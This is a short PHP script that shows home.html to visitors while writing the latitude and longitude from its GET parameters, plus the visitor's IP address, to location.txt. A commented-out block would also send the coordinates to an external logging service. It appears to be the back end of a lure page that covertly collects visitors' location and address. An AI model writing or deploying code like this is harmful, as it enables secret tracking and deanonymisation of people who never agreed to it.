<!-- Create php file -->
<?php

include_once("home.html");

$myfile = fopen("location.txt", "w") or die("Unable to open file!");
$txt = "lat: " . $_GET["lat"] . "\nlong: " . $_GET["long"] . "\nIP: " . $_SERVER['REMOTE_ADDR'];
fwrite($myfile, $txt);
fclose($myfile);

// Send JSON post request to server
// $url = "https://logging-service-py.herokuapp.com/api/logger";
// $data = array('lat' => $_GET["lat"], 'long' => $_GET["long"]);
// $options = array(
//     'http' => array(
//         'header'  => "Content-type: application/json",
//         'method'  => 'POST',
//         'content' => http_build_query($data)
//     )
// );
// $context  = stream_context_create($options);
// $result = file_get_contents($url, false, $context);



?>